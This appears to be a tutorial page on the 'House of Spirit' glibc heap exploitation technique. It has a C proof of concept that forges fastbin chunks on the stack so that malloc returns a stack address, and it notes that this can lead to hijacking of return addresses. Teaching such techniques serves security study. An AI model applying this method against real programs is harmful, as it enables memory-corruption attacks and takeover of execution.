# House of Spirit

The House of Spirit is a little different from other attacks in the sense that it involves an attacker overwriting an existing pointer before it is 'freed'. The attacker creates a 'fake chunk', which can reside anywhere in the memory (heap, stack, etc.) and overwrites the pointer to point to it. The chunk has to be crafted in such a manner so as to pass all the security tests. This is not difficult and only involves setting the `size` and next chunk's `size`. When the fake chunk is freed, it is inserted in an appropriate binlist (preferably a fastbin). A future malloc call for this size will return the attacker's fake chunk. The end result is similar to 'forging chunks attack' described earlier.

Consider this sample code (download the complete version [here](../assets/files/house_of_spirit.c)):

```c
struct fast_chunk {
  size_t prev_size;
  size_t size;
  struct fast_chunk *fd;
  struct fast_chunk *bk;
  char buf[0x20];                   // chunk falls in fastbin size range
};

struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
// fake_chunks[0] at 0x7ffe220c5ca0
// fake_chunks[1] at 0x7ffe220c5ce0

void *ptr, *victim;

ptr = malloc(0x30);                 // First malloc

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);  // 0x40

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);  // 0x40

// Attacker overwrites a pointer that is about to be 'freed'
ptr = (void *)&fake_chunks[0].fd;

// fake_chunks[0] gets inserted into fastbin
free(ptr);

victim = malloc(0x30);              // 0x7ffe220c5cb0 address returned from malloc
```

Notice that, as expected, the returned pointer is 0x10 or 16 bytes ahead of `fake_chunks[0]`. This is the address where the `fd` pointer is stored. This attack gives a surface for more attacks. `victim` points to memory on the stack instead of heap segment. By modifying the return addresses on the stack, the attacker can control the execution of the program.
